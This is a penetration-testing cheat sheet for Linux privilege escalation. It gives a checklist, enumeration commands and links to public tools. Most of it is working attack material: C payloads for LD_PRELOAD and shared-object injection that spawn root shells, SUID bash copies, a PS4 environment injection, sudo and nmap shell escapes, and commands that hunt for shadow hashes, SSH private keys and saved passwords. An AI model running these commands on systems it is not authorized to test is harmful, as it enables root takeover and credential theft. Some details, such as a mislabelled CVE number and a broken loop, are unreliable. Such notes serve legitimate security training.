  
# Linux Host Enumeration   
## Contents 


## Checklists / What to look for
- [ ] Get a fully functional TTY  
- [ ] General host enum 
- [ ] Transfer files and run scripts 
- [ ] Sudo exploits   
- [ ] Exploitable cronjobs 
- [ ] SUID/SGID binaries  
- [ ] Services (running as root, only available to localhost)  
- [ ] Passwords / config files 
- [ ] Binaries with exploitable capabilities 
- [ ] NFS No root squashing  
- [ ] Container escapes 
- [ ] Is the kernel vulnerable  (last resort priv esc) 
- [ ] Further access into the network / post exploitation 

[Tiberius Linux Privilige Escalation](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux.rst)     
[PayloadAllTheThings Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)   

[Linux Explain Shell](https://www.explainshell.com/)   
[Static Binaries](https://github.com/andrew-d/static-binaries)  

## Upgrade to a fully functional TTY 
### Check 
    if [ -t 1 ] ; then echo terminal; else echo "not a terminal"; fi 
### Upgrade 
    python -c 'import pty;pty.spawn("/bin/bash")' 
    echo os.system('/bin/bash') 
    /bin/sh -i 
    
[Gaining TTY](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/gaining-tty.rst) 
[Breaking out of shellcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells) 
[Restricted Shell Bypass](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) 


## Quick Enumeration Commands  
    hostname; ip addr;    
    whoami; id   
    uname -r   
    su -, su root (no password, root, password) 
    sudo -l  
    ps -aux | grep root 
    netstat -antp   
    
### Important Files to Check 
    cat /etc/passwd | grep /bin/bash   
    ls -al /etc/shadow       #crack with hashcat -m 1800  
    ls -al /etc/passwd 
    /etc/sudoers
    /etc/hosts               #local DNS entries 
    
## File Transfer 
    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
    
## Scripts   
### General Linux Enum 
run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with increasing run levels, [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [linenum](https://github.com/rebootuser/LinEnum) 
### Specialized Scripts 
[Docker and Container escapes - DEEPCE](https://github.com/stealthcopter/deepce)   
[SUDO Killer: sudo exploits](https://github.com/TH3xACE/SUDO_KILLER)  
[Uptux - Specialized priv esc checks](https://github.com/initstring/uptux) 


## Sudo exploits 
[SUDO_KILLER enum script](https://github.com/TH3xACE/SUDO_KILLER)  

sudo -l, cat /etc/sudoers, check gtfobins  
sudo -V    
## Sudo LD_PRELOAD   
sudo -l, see env_keep+=LD_PRELOAD. apache2

    #include <stdio.h> 
    #include <sys/types.h>
    #include <stdlib.h>
    void _init(){
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
    } 
    
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c 

sudo LD_PRELOAD=/tmp/preload.so [sudo binary] 

## CVE-2019-14287 
sudo -l, see (ALL,!root)  

    sudo -u#-1 [binary escape]  
## CVE-2019-16634 
sudo su root, type password, see ******: passwd feedback enabled  

[proof of concept](https://github.com/saleemrashid/sudo-cve-2019-18634)  
## CVE-2021-3156 - Baron Samedit 
[Qualys blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)  
[proof of concept](https://github.com/stong/CVE-2021-3156)  


## Misc sudo binaries  
    echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
    sudo apache2 -f /etc/shadow

## Cronjobs    
look for scripts you can write to running as a cronjob, writeable cron directory/crontab, writeable PATH directories used, wildcard expansion 

    cat /etc/crontab  
    crontab -l    
    ls -al /etc/cron* 
## PATH variable 
If a cronjob doesn’t use an absolute path and one of path dirs is writable by user: can create a script with the same name as the cron job so it is executed. 
default /usr/bin:/bin 

    echo $PATH 
    cat /etc/crontab     
### Rootbash script 
    #!/bin/bash 
    cp /bin/bash /tmp/rootbash 
    chmod +s /tmp/rootbash 
### Wildcards 
[Exploiting wildcards in Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) 

## SUID Binaries 
Overwrite binary, use [gtfobins](https://gtfobins.github.io/) exploits, insert missing shared object, manipulate enviromental variables 

    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null     
    find / -type f -a -perm -o+x -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null  
    
### Custom Executable
    int main(){
        setuid(0);
        system("/bin/bash -p");
    }  
### Shared Object Injection 
look for missing shared objects searched for in writable directories 

    strace [suid binary] 2>&1 | grep -iE “open|access|no such file” 
    [missing shared object].c  
    
    #include <stdio.h> 
    #include <stdlib.h> 
    static void inject() __attribute__((constructor));  
    void inject(){ 
     setuid(0); 
     system("/bin/bash -p"); 
    } 
    
    gcc -shared -fPIC -o [missing shared object].so [missing shared object].c 
    run suid binary 
### PATH Enviromental Variables 
SUID /SGID binary tries to execute another file without absolute path? -> change PATH var 

    strings [suid binary] 
    strace -v -f -e execve [suid binary] 2>&1 | grep exec 
    ltrace [suid binary]  
    
compile custom executable with name of file suid binary is calling
set PATH variable to current directory and run suid binary  

    PATH=.:$PATH /usr/local/bin/suid-env
### SUID Binary Function Replace  
    strings /usr/local/bin/suid-env2  
    
    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p' 
    
### Misc SUID binaries 
use binary to exec /bin/bash -p 

    pkexec --user root /bin/sh  
## Services Running as Root / Services Only Running Locally
    ps -aux | grep root 
    netstat -etulp 
    mysql running as root [exploit](https://www.exploit-db.com/exploits/1518)  
    ftp, telnet - tcpdump to sniff creds??
## Passwords / config files 
    /etc/passwd, /etc/shadow, /etc/sudoers  read or write?? 
    cat ~/.ssh  
    cat ~/.bash_history | grep -i passw  
    
search for strings (search for username if scripts aren't picking up creds):

    grep -rwl "password" /var     

### SSH Keys   
    find / -name authorized_keys 2> /dev/null
    find / -name id_rsa 2> /dev/null   

## Capabilities 
check gtfobins, [capabilities reference](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities) 

    getcap -r / 2>/dev/null  

## Container Escapes 
docker, lxd, 
[Docker and Container escapes - DEEPCE](https://github.com/stealthcopter/deepce)   
[Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)  

    docker ps -a 


## NFS No Root Squashing   
Allows you to mount drive onto attack box, create a SUID binary that you can run on the victim.  

    cat /etc/exports     
    showmount -e [victim ip]   
    mount -o rw,vers=2 [victim ip]:/mntFolder /mntFolder/tmp   

## Kernel Exploits 
    uname -a  
    cat /etc/*-release
    
### Cross compile 
No compilers on host: use gcc-multilib -m32 (32 bit OS) or -m64 (64 bit OS) then upload   

    gcc -m32 -o output32 exploit.c     #(32 bit) 
    gcc -m64 -o output exploit.c       #(64 bit)  
    
## Further Access into a Network 
### Network Enumeration 
    netstat -antp; arp -a 
    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " " 
    cat /etc/hosts  

# Resources 
## Learn More 
[Hacktricks Linux Privilige Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)      
[Local Priv Esc workshop](https://github.com/sagishahar/lpeworkshop)      
[Basic Linux Priv Esc](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)     
[A Guide to Linux Privilige Escalation](https://payatu.com/guide-linux-privilege-escalation)   
[g0tm1lk checklist](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)     
[Linux elevation of privileges ToC](https://guif.re/linuxeop)       
[Linux Enumeration](https://zweilosec.gitbook.io/hackers-rest/linux-1/linux-redteam/enumeration) 

